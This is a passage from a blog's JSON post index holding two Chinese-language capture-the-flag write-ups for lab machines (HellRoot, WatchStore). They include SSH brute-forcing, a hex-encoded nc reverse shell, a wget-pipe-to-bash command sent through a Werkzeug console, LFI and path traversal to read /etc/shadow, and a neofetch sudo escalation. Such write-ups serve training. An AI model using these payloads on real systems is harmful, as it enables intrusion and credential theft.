flag\uff0c\u672c\u6b21\u6e17\u900f\u6d4b\u8bd5\u5706\u6ee1\u7ed3\u675f\u3002sentence", "top": 0, "createdAt": 1755399668, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-17", "dateLabelColor": "#0969da"}, "P220": {"htmlDir": "docs/post/thl_HellRoot.html", "labels": ["thehackerlabs"], "postTitle": "thl_HellRoot", "postUrl": "post/thl_HellRoot.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/220", "commentNum": 0, "wordCount": 4682, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n\u9996\u5148\uff0c\u5bf9\u76ee\u6807\u7f51\u6bb5\u8fdb\u884c\u4e3b\u673a\u53d1\u73b0\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.144 08:00:27:d0:16:be       PCS Systemtechnik GmbH\n...\n```\n\n\u786e\u5b9a\u76ee\u6807\u4e3b\u673aIP\u4e3a `192.168.205.144` \u540e\uff0c\u5bf9\u5176\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u53d1\u73b0\u5f00\u653e\u4e86\u591a\u4e2a\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.144\n...\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n222/tcp  open  rsh-spx\n443/tcp  open  https\n5000/tcp open  upnp\n...\n```\n\n# **\u4e8c\u3001\u6377\u5f84\uff1aSSH\u7206\u7834**\n\n\u5728\u6df1\u5165\u63a2\u7d22\u4e4b\u524d\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u6781\u5176\u7b80\u5355\u7684\u63d0\u6743\u8def\u5f84\u3002\u901a\u8fc7\u5bf9SSH\u670d\u52a1\u8fdb\u884c\u5f31\u53e3\u4ee4\u7206\u7834\uff0c\u53ef\u4ee5\u8fc5\u901f\u83b7\u5f97root\u6743\u9650\u3002\n\n\u51c6\u5907\u4e00\u4e2a\u7b80\u5355\u7684\u7528\u6237\u5b57\u5178\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ echo 'root\\nadmin\\n' > user\n```\n\n\u4f7f\u7528`hydra`\u5de5\u5177\u548c\u4e00\u4e2a\u5e38\u7528\u5bc6\u7801\u5b57\u5178\uff08\u6b64\u5904\u4e3a`5000q.txt`\uff09\u8fdb\u884c\u7206\u7834\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ hydra -L user -P 5000q.txt ssh://192.168.205.144 -f -I -u -e nsr -t 64 \n...\n[22][ssh] host: 192.168.205.144   login: root   password: 12345\n...\n```\n\n\u6210\u529f\u7206\u7834\u51faroot\u7528\u6237\u7684\u5bc6\u7801\u4e3a `12345`\u3002\u76f4\u63a5\u767b\u5f55\u5373\u53ef\u5b8c\u6210\u9776\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ssh root@192.168.205.144\n...\nroot@hellroot:~# cat /home/astro/user.txt /root/root.txt \nf220dcf45ccfc10c4c44ea8c413186f2\nf039facf1ae0d69b07484df1c4da32df\n```\n\n# **\u4e09\u3001\u5e38\u89c4\u8def\u5f84\uff1aWeb\u6e17\u900f**\n\n\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u63a2\u7d22\u9884\u8bbe\u7684\u3001\u66f4\u5177\u6311\u6218\u6027\u7684\u653b\u51fb\u8def\u5f84\u3002\n\n## **1. Gitea\u4ee3\u7801\u5ba1\u8ba1**\n\n\u8bbf\u95ee\u76ee\u680780\u7aef\u53e3\uff0c\u9875\u9762\u4e3aApache\u9ed8\u8ba4\u9875\uff0c\u65e0\u53ef\u7528\u4fe1\u606f\u3002\u8bbf\u95ee443\u7aef\u53e3\uff0c\u53d1\u73b0\u9875\u9762\u8df3\u8f6c\u81f3 `git.hellroot.thl`\u3002\u6211\u4eec\u5c06\u6b64\u57df\u540d\u4e0e\u76ee\u6807IP\u7ed1\u5b9a\u5230 `/etc/hosts` \u6587\u4ef6\u4e2d\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ tail -n 1 /etc/hosts\n192.168.205.144 git.hellroot.thl\n```\n\n\u91cd\u65b0\u8bbf\u95ee `https://git.hellroot.thl`\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a Gitea \u670d\u52a1\uff08\u7248\u672c1.24.3\uff09\u3002\u5176\u4e2d\u5b58\u5728\u4e00\u4e2a\u540d\u4e3a `Astro/hellroot.thl` \u7684\u516c\u5f00\u4ee3\u7801\u4ed3\u5e93\u3002\n\n\u5728\u4ed3\u5e93\u7684 `Dockerfile` \u6587\u4ef6\u4e2d\uff0c\u53d1\u73b0\u4e86\u4e00\u7ec4\u51ed\u636e\uff1a`astro:iloveastro`\u3002\n\n\u5728 `index.php` \u6587\u4ef6\u4e2d\uff0c\u6211\u4eec\u5ba1\u8ba1\u5230\u4e00\u6bb5\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u7684\u4ee3\u7801\u3002\u8be5\u4ee3\u7801\u8fd0\u884c\u57285000\u7aef\u53e3\u3002\n\n```php\n<?php\nif ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['domain'])) {\n    $input = trim($_POST['domain']);\n    $decoded = @hex2bin($input);\n\n    // ...\n\n    if ($decoded !== false && ctype_print($decoded)) {\n        if (strpos($decoded, ';') !== false) {\n            // Remove header modification that breaks execution\n            $output = shell_exec($decoded . ' 2>&1'); // \u5b58\u5728\u547d\u4ee4\u6ce8\u5165\n        } else {\n            $safeDomain = escapeshellarg($decoded);\n            $output = shell_exec('nslookup $safeDomain 2>&1');\n        }\n    } else {\n        // ...\n    }\n    // ...\n}\n?>\n```\n\n\u4ee3\u7801\u903b\u8f91\u663e\u793a\uff0c\u5982\u679cPOST\u8bf7\u6c42\u7684`domain`\u53c2\u6570\u7ecf\u8fc7\u5341\u516d\u8fdb\u5236\u89e3\u7801\u540e\u5305\u542b\u5206\u53f7`;`\uff0c\u5219\u4f1a\u76f4\u63a5\u62fc\u63a5\u5230`shell_exec`\u51fd\u6570\u4e2d\u6267\u884c\uff0c\u9020\u6210\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff08RCE\uff09\u6f0f\u6d1e\u3002\n\n## **2. RCE\u6f0f\u6d1e\u5229\u7528**\n\n\u6211\u4eec\u53ef\u4ee5\u5c06\u4efb\u610f\u547d\u4ee4\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u6765\u7ed5\u8fc7\u8fc7\u6ee4\u5e76\u6267\u884c\u3002\u9996\u5148\uff0c\u6d4b\u8bd5`id;`\u547d\u4ee4\uff0c\u5176\u5341\u516d\u8fdb\u5236\u4e3a`69643b`\u3002\u57285000\u7aef\u53e3\u7684\u670d\u52a1\u4e0a\u63d0\u4ea4\u8be5payload\uff0c\u6210\u529f\u6267\u884c\u3002\n\n\u4e3a\u4e86\u83b7\u53d6\u4e00\u4e2a\u4ea4\u4e92\u5f0fShell\uff0c\u6211\u4eec\u6784\u9020\u4e00\u4e2a\u53cd\u5f39Shell\u7684payload\u3002\u76ee\u6807\u4e3b\u673a\u5b58\u5728`nc`\uff0c\u56e0\u6b64\u4f7f\u7528`nc`\u8fdb\u884c\u53cd\u5f39\u3002\n\n**Payload**: `nc 192.168.205.128 8888 -e /bin/bash;`\n**Hex\u7f16\u7801**: `6e63203139322e3136382e3230352e3132382038383838202d65202f62696e2f626173683b`\n\n\u5728Kali\u4e0a\u5f00\u542f\u76d1\u542c\uff0c\u5e76\u63d0\u4ea4\u4e0a\u8ff0Payload\uff0c\u6210\u529f\u63a5\u6536\u5230\u53cd\u5f39Shell\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888                 \nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.144] 59278\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n\u5f53\u524d\u7528\u6237\u4e3a `www-data`\uff0c\u8fd9\u662f\u4e00\u4e2aDocker\u5bb9\u5668\u5185\u7684\u4f4e\u6743\u9650\u7528\u6237\u3002\n\n# **\u56db\u3001Docker\u5185\u63d0\u6743\u4e0e\u6d41\u91cf\u55c5\u63a2**\n\n\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u53d1\u73b0\u4e00\u4e2a\u63d0\u793a\u6587\u4ef6`sniff.txt`\uff0c\u5185\u5bb9\u4e3a\u897f\u73ed\u7259\u8bed\uff0c\u610f\u4e3a\u201c\u6709\u4e9b\u5de5\u5177\u53ef\u4ee5\u8ba9\u4f60\u55c5\u63a2\u6d41\u91cf\u201d\u3002\u540c\u65f6\u5728`.config/dpkg-l.txt`\u6587\u4ef6\u4e2d\u53d1\u73b0\u7cfb\u7edf\u5b89\u88c5\u4e86`tcpdump`\u3002\n\n\u8fd9\u63d0\u793a\u6211\u4eec\u9700\u8981\u8fdb\u884c\u6d41\u91cf\u6293\u5305\u3002\u4f7f\u7528\u4e4b\u524d\u5728`Dockerfile`\u4e2d\u627e\u5230\u7684\u5bc6\u7801 `astro:iloveastro` \u5207\u6362\u5230`astro`\u7528\u6237\u3002\n\n```bash\nwww-data@05cc10128c04:/var/www/html$ su astro\nPassword: iloveastro\n$\n```\n\n\u67e5\u770b`astro`\u7528\u6237\u7684`sudo`\u6743\u9650\uff0c\u53d1\u73b0\u5176\u53ef\u4ee5\u65e0\u5bc6\u7801\u5207\u6362\u5230root\u3002\n\n```bash\nastro@05cc10128c04:/var/www/html$ sudo -l\n...\nUser astro may run the following commands on 05cc10128c04:\n    (ALL : ALL) NOPASSWD: /bin/su\n```\n\n\u5207\u6362\u5230root\u7528\u6237\uff0c\u5e76\u4f7f\u7528`tcpdump`\u5728`eth0`\u7f51\u5361\u4e0a\u8fdb\u884c\u6293\u5305\u3002\n\n```bash\nastro@05cc10128c04:/var/www/html$ sudo su\nroot@05cc10128c04:/var/www/html# tcpdump -i eth0 -A -w /tmp/a.pcap\n```\n\n\u8ba9`tcpdump`\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\u540e\uff0c\u5c06\u6293\u53d6\u5230\u7684\u6570\u636e\u5305`a.pcap`\u4f20\u9001\u5230Kali\u653b\u51fb\u673a\u8fdb\u884c\u5206\u6790\u3002\n\n\u4f7f\u7528Wireshark\u6253\u5f00`a.pcap`\uff0c\u901a\u8fc7HTTP\u534f\u8bae\u8fc7\u6ee4\u5668\uff0c\u53d1\u73b0\u4e00\u4e2aPOST\u8bf7\u6c42\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u767b\u5f55\u51ed\u636e\u3002\u8fd9\u5f88\u53ef\u80fd\u662f\u4e3b\u673a\u4e0a\u7684\u5b9a\u65f6\u4efb\u52a1\u5728\u6267\u884c\u3002\n\n*   **username**: `astro`\n*   **password**: `wj2UI4f207RC58nNx31gBUiBYSPEK27JxvRNBYbP6UWZpqeoWS`\n\n# **\u4e94\u3001\u4e3b\u673a\u63d0\u6743**\n\n\u6211\u4eec\u83b7\u5f97\u4e86\u4e3b\u673a`astro`\u7528\u6237\u7684\u5bc6\u7801\uff0c\u73b0\u5728\u53ef\u4ee5\u4eceDocker\u5bb9\u5668\u6a2a\u5411\u79fb\u52a8\u5230\u4e3b\u673a\u7cfb\u7edf\u3002\n\n\u4f7f\u7528\u65b0\u5bc6\u7801SSH\u767b\u5f55\u4e3b\u673a\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ssh astro@192.168.205.144\n...\nastro@hellroot:~$ \n```\n\n\u767b\u5f55\u540e\uff0c\u5bfb\u627e\u63d0\u6743\u65b9\u6cd5\u3002\u9996\u5148\u68c0\u67e5SUID\u6587\u4ef6\u3002\n\n```bash\nastro@hellroot:~$ find / -perm -4000 -type f 2>/dev/null\n...\n/usr/local/bin/secmonitor\n/usr/local/bin/logview\n...\n```\n\n\u53d1\u73b0\u4e24\u4e2a\u53ef\u7591\u7684\u81ea\u5b9a\u4e49SUID\u7a0b\u5e8f\uff1a`secmonitor`\u548c`logview`\u3002\u9010\u4e00\u8fdb\u884c\u6d4b\u8bd5\u3002\n\n`logview`\u7a0b\u5e8f\u7528\u4e8e\u67e5\u770b\u65e5\u5fd7\u6587\u4ef6\uff0c\u4f46\u5176\u5b9e\u73b0\u5b58\u5728\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\u3002\u7a0b\u5e8f\u4f1a\u5c06\u7528\u6237\u8f93\u5165\u7684\u6587\u4ef6\u540d\u62fc\u63a5\u5230`/var/log/`\u76ee\u5f55\u4e0b\uff0c\u4f46\u672a\u5bf9`../`\u8fdb\u884c\u8fc7\u6ee4\u3002\n\n```bash\nastro@hellroot:~$ /usr/local/bin/logview /root/root.txt\n[logview] Running with administrative privileges\nDisplaying log: /var/log//root/root.txt\nfopen: No such file or directory\n```\n\n\u5229\u7528\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\uff0c\u4f8b\u5982`root.txt`\u3002\n\n```bash\nastro@hellroot:~$ /usr/local/bin/logview ../../../root/root.txt\n[logview] Running with administrative privileges\nDisplaying log: /var/log/../../../root/root.txt\nf039facf1ae0d69b07484df1c4da32df\n```\n\n\u540c\u7406\uff0c\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6 `/etc/shadow` \u6587\u4ef6\uff0c\u83b7\u53d6\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u3002\u5c06root\u7528\u6237\u7684\u54c8\u5e0c\u8fdb\u884c\u7834\u89e3\uff0c\u53ef\u4ee5\u5f97\u5230\u5bc6\u7801\u4e3a`12345`\uff0c\u4e0e\u6700\u521dSSH\u7206\u7834\u7684\u7ed3\u679c\u4e00\u81f4\u3002\u81f3\u6b64\uff0c\u901a\u8fc7\u5e38\u89c4\u8def\u5f84\u4e5f\u6210\u529f\u83b7\u53d6\u4e86root\u6743\u9650\u3002sentence", "top": 0, "createdAt": 1755440154, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-17", "dateLabelColor": "#0969da"}, "P223": {"htmlDir": "docs/post/thl_watchstore.html", "labels": ["thehackerlabs"], "postTitle": "thl_watchstore", "postUrl": "post/thl_watchstore.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/223", "commentNum": 0, "wordCount": 5375, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **1.1 \u4e3b\u673a\u53d1\u73b0**\n\n\u9996\u5148\uff0c\u5728\u5f53\u524d\u7f51\u6bb5\u4e2d\u4f7f\u7528 `arp-scan` \u8fdb\u884c\u4e3b\u673a\u53d1\u73b0\uff0c\u786e\u5b9a\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l       \n...\n192.168.205.152 08:00:27:e0:02:1a       PCS Systemtechnik GmbH\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u8868\u660e\uff0c\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\u4e3a `192.168.205.152`\u3002\n\n## **1.2 \u7aef\u53e3\u626b\u63cf**\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5f00\u653e\u7684\u7aef\u53e3\u548c\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.152\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 07:42 EDT\nNmap scan report for watchstore.thl (192.168.205.152)\nHost is up (0.00026s latency).\nNot shown: 65534 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n8080/tcp open  http-proxy\nMAC Address: 08:00:27:E0:02:1A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n...\n```\n\n\u626b\u63cf\u53d1\u73b0\u4e3b\u673a\u5f00\u653e\u4e86 `22` (SSH) \u548c `8080` (http-proxy) \u4e24\u4e2a\u7aef\u53e3\u3002\u8bbf\u95ee8080\u7aef\u53e3\u7684Web\u670d\u52a1\u65f6\uff0c\u9875\u9762\u8df3\u8f6c\u5230\u4e86\u57df\u540d `watchstore.thl`\u3002\n\n## **1.3 \u672c\u5730DNS\u89e3\u6790\u914d\u7f6e**\n\n\u4e3a\u4e86\u6b63\u5e38\u8bbf\u95ee\u8be5\u7f51\u7ad9\uff0c\u9700\u8981\u5c06\u57df\u540d\u4e0eIP\u5730\u5740\u7684\u6620\u5c04\u5173\u7cfb\u6dfb\u52a0\u5230\u672c\u5730\u7684 `/etc/hosts` \u6587\u4ef6\u4e2d\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ tail -n 1 /etc/hosts\n192.168.205.152 watchstore.thl\n```\n\n## **1.4 Web\u76ee\u5f55\u626b\u63cf**\n\n\u914d\u7f6e\u597dhosts\u540e\uff0c\u4f7f\u7528 `gobuster` \u5bf9\u7f51\u7ad9\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\uff0c\u5bfb\u627e\u9690\u85cf\u7684\u8def\u5f84\u6216\u529f\u80fd\u70b9\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://watchstore.thl:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64\n===============================================================\n...\n===============================================================\n/products             (Status: 200) [Size: 772]\n/read                 (Status: 500) [Size: 13133]\n/console              (Status: 200) [Size: 1563]\n...\n```\n\n\u626b\u63cf\u53d1\u73b0\u4e86\u51e0\u4e2a\u5173\u952e\u8def\u5f84\uff0c\u5176\u4e2d `/read` \u8fd4\u56de\u4e86500\u9519\u8bef\uff0c`/console` \u9875\u9762\u4f3c\u4e4e\u662f\u4e00\u4e2a\u63a7\u5236\u53f0\u3002\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u6316\u6398\u4e0e\u5229\u7528**\n\n## **2.1 Werkzeug\u8c03\u8bd5\u5668\u4fe1\u606f\u6cc4\u9732**\n\n\u76f4\u63a5\u8bbf\u95ee `/read` \u8def\u5f84\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u4e86\u4e00\u4e2a\u8be6\u7ec6\u7684\u9519\u8bef\u9875\u9762\u3002\u8fd9\u662f\u4e00\u4e2a\u7531 Werkzeug \u542f\u52a8\u7684\u8c03\u8bd5\u5668\u754c\u9762\uff0c\u901a\u5e38\u5728\u5f00\u53d1\u73af\u5883\u4e2d\u51fa\u73b0\uff0c\u5f53Web\u5e94\u7528\u5728\u8c03\u8bd5\u6a21\u5f0f\uff08Debug Mode\uff09\u4e0b\u8fd0\u884c\u65f6\uff0c\u82e5\u7a0b\u5e8f\u51fa\u73b0\u672a\u88ab\u6355\u83b7\u7684\u5f02\u5e38\uff0c\u5c31\u4f1a\u5c55\u793a\u8be5\u9875\u9762\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://watchstore.thl:8080/read'\n...\n<h1>Exception</h1>\n<div class='detail'>\n  <p class='errormsg'>Exception: Falta el par\u00e1metro &#x27;id&#x27;\n</p>\n</div>\n<h2 class='traceback'>Traceback <em>(most recent call last)</em></h2>\n...\n  <h4>File <cite class='filename'>'/home/relox/watchstore/app.py'</cite>,\n      line <em class='line'>65</em>,\n      in <code class='function'>read_file</code></h4>\n...\n  <blockquote>Exception: Falta el par\u00e1metro 'id'\n</blockquote>\n...\n```\n\n\u8fd9\u4e2a\u62a5\u9519\u9875\u9762\u6cc4\u9732\u4e86\u4ee5\u4e0b\u5173\u952e\u4fe1\u606f\uff1a\n1.  **\u9519\u8bef\u539f\u56e0**\uff1a\u63d0\u793a 'Falta el par\u00e1metro 'id''\uff0c\u8bf4\u660e `/read` \u8def\u7531\u9700\u8981\u4e00\u4e2a\u540d\u4e3a `id` \u7684\u53c2\u6570\u3002\n2.  **\u7edd\u5bf9\u8def\u5f84**\uff1a\u66b4\u9732\u4e86\u5e94\u7528\u7a0b\u5e8f\u7684\u7edd\u5bf9\u8def\u5f84 `/home/relox/watchstore/app.py`\u3002\n3.  **\u6f0f\u6d1e\u7c7b\u578b**\uff1a\u4ece\u51fd\u6570\u540d `read_file` \u548c\u53c2\u6570 `id` \u63a8\u65ad\uff0c\u8fd9\u91cc\u53ef\u80fd\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\uff08LFI\uff09\u6f0f\u6d1e\u3002\n4.  **\u8c03\u8bd5\u63a7\u5236\u53f0**\uff1aWerkzeug\u8c03\u8bd5\u5668\u901a\u5e38\u5305\u542b\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u63a7\u5236\u53f0\uff0c\u53ef\u4ee5\u901a\u8fc7 PIN \u7801\u89e3\u9501\u540e\u6267\u884c\u4efb\u610fPython\u4ee3\u7801\u3002\n\n## **2.2 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u5229\u7528**\n\n\u5229\u7528\u4e0a\u4e00\u6b65\u53d1\u73b0\u7684LFI\u6f0f\u6d1e\u548c\u6cc4\u9732\u7684\u7edd\u5bf9\u8def\u5f84\uff0c\u5c1d\u8bd5\u8bfb\u53d6 `app.py` \u6587\u4ef6\u7684\u6e90\u4ee3\u7801\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://watchstore.thl:8080/read?id=/home/relox/watchstore/app.py'\n\n<pre>import os\nos.environ['WERKZEUG_DEBUG_PIN'] = '612-791-734'\n\nfrom flask import Flask, render_template, request, abort, redirect\n...\n@app.route('/read')\ndef read_file():\n    filepath = request.args.get('id')\n    if not filepath:\n        raise Exception('Falta el par\u00e1metro 'id'')  # Esto mostrar\u00e1 el traceback\n    try:\n        with open(filepath, 'r') as f:\n            content = f.read()\n    except Exception as e:\n        content = f'No se pudo leer el archivo: {e}'\n    return f'<pre>{content}</pre>'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080, debug=True)\n</pre>\n```\n\n\u6210\u529f\u8bfb\u53d6\u5230 `app.py` \u7684\u6e90\u4ee3\u7801\u3002\u4ee3\u7801\u4e2d\u660e\u786e\u6307\u51fa\u4e86 `debug=True`\uff0c\u5e76\u4e14\u786c\u7f16\u7801\u4e86 **Werkzeug \u8c03\u8bd5\u5668\u7684PIN\u7801\uff1a`612-791-734`**\u3002\n\n## **2.3 \u83b7\u53d6\u53cd\u5411Shell**\n\n\u6709\u4e86PIN\u7801\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u4e4b\u524d\u53d1\u73b0\u7684 `/console` \u8def\u5f84\u6765\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\n\n1.  \u8bbf\u95ee `http://watchstore.thl:8080/console`\u3002\n2.  \u5728PIN\u7801\u8f93\u5165\u6846\u4e2d\u8f93\u5165 `612-791-734` \u89e3\u9501\u63a7\u5236\u53f0\u3002\n3.  \u5728\u63a7\u5236\u53f0\u4e2d\u8f93\u5165\u53ef\u4ee5\u53cd\u5f39shell\u7684Python\u4ee3\u7801\u3002\u8fd9\u91cc\u4f7f\u7528 `wget` \u4e0b\u8f7d\u5e76\u6267\u884c\u8fdc\u7a0b\u811a\u672c\u7684\u65b9\u5f0f\u3002\n\n```python\nimport os\nos.system('busybox wget 192.168.205.128/reverse.sh -O - | bash')\n```\n\n\u6267\u884c\u540e\uff0c\u5728\u672c\u5730\u76d1\u542c\u7684\u7aef\u53e3\u6210\u529f\u63a5\u6536\u5230\u6765\u81ea\u76ee\u6807\u670d\u52a1\u5668\u7684shell\u3002\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **3.1 \u521d\u6b65\u7acb\u8db3\u4e0e\u4fe1\u606f\u6536\u96c6**\n\n\u83b7\u53d6\u521d\u59cbshell\u540e\uff0c\u8fdb\u884c\u7b80\u5355\u7684\u73af\u5883\u914d\u7f6e\u548c\u4fe1\u606f\u6536\u96c6\u3002\n\n```bash\n# \u7a33\u5b9ashell\nrelox@thehackerslabs-watchstore:~/watchstore$ export TERM=xterm\nrelox@thehackerslabs-watchstore:~/watchstore$ export SHELL=/bin/bash\nrelox@thehackerslabs-watchstore:~/watchstore$ stty rows 24 columns 80\n\n# \u67e5\u770b\u5f53\u524d\u76ee\u5f55\u548c\u4e0a\u7ea7\u76ee\u5f55\nrelox@thehackerslabs-watchstore:~/watchstore$ ls -al\n...\n-rw-r--r-- 1 relox relox 2212 jun 16 10:57 app.py\n...\nrelox@thehackerslabs-watchstore:~$ ls -al\n...\n-rw-r--r-- 1 relox relox   33 jun 16 11:10 user.txt\n...\n\n# \u8bfb\u53d6user flag\nrelox@thehackerslabs-watchstore:~$ cat user.txt \n43209bbbe021f88cf1a53b9e5da8a\n```\n\n\u63a5\u4e0b\u6765\uff0c\u4f7f\u7528 `sudo -l` \u547d\u4ee4\u68c0\u67e5\u5f53\u524d\u7528\u6237 `relox` \u7684 `sudo` \u6743\u9650\u3002\n\n```bash\nrelox@thehackerslabs-watchstore:~$ sudo -l\n...\nUser relox may run the following commands on thehackerslabs-watchstore:\n    (root) NOPASSWD: /usr/bin/neofetch\n```\n\n\u7ed3\u679c\u663e\u793a\uff0c`relox` \u7528\u6237\u53ef\u4ee5\u65e0\u9700\u5bc6\u7801\u4ee5 `root` \u8eab\u4efd\u6267\u884c `/usr/bin/neofetch` \u547d\u4ee4\u3002\n\n## **3.2 \u5229\u7528 neofetch Sudo \u63d0\u6743**\n\n\u67e5\u8be2 [GTFOBins](https://gtfobins.github.io/gtfobins/neofetch/#sudo) \u53ef\u77e5\uff0c`neofetch` \u53ef\u4ee5\u901a\u8fc7 `--config` \u53c2\u6570\u52a0\u8f7d\u4e00\u4e2a\u81ea\u5b9a\u4e49\u914d\u7f6e\u6587\u4ef6\u3002\u5982\u679c\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\u662f\u53ef\u6267\u884c\u7684\u547d\u4ee4\uff0c`neofetch` \u4f1a\u5728\u542f\u52a8\u65f6\u6267\u884c\u5b83\u3002\n\n\u5229\u7528\u6b64\u7279\u6027\uff0c\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u6076\u610f\u7684\u914d\u7f6e\u6587\u4ef6\u6765\u83b7\u53d6 `root` shell\u3002\n\n1.  \u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u5185\u5bb9\u4e3a\u6267\u884c `/bin/bash`\u3002\n\n    ```bash\n    relox@thehackerslabs-watchstore:~$ echo 'exec /bin/bash' > shell_config\n    ```\n\n2.  \u4f7f\u7528 `sudo` \u548c `--config` \u53c2\u6570\u6307\u5b9a\u8be5\u6587\u4ef6\u6765\u8fd0\u884c `neofetch`\u3002\n\n    ```bash\n    relox@thehackerslabs-watchstore:~$ sudo /usr/bin/neofetch --config shell_config\n    ```\n\n\u547d\u4ee4\u6267\u884c\u540e\uff0c\u6210\u529f\u83b7\u5f97\u4e86 `root` \u6743\u9650\u7684shell\u3002\n\n## **3.3 \u83b7\u53d6 Root Flag**\n\n\u6700\u540e\uff0c\u8bfb\u53d6 `/root` \u76ee\u5f55\u4e0b\u7684 `root.txt` \u6587\u4ef6\uff0c\u5b8c\u6210\u63d0\u6743\u3002\n\n```bash\nroot@thehackerslabs-watchstore:/home/relox# cat /root/root.txt \nc3ab266a11de0294257eaef3571bdf37\n```sentence", "top": 0, "createdAt": 1755517767, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-18", "dateLabelColor": "#0969da"}, "P224": {"htmlDir": "docs/post/hmv_Lazzycorp.html", "labels": ["HackMyVM"], "postTitle": "hmv_Lazzycorp", "postUrl": "post/hmv_Lazzycorp.html", "postSourceUrl": 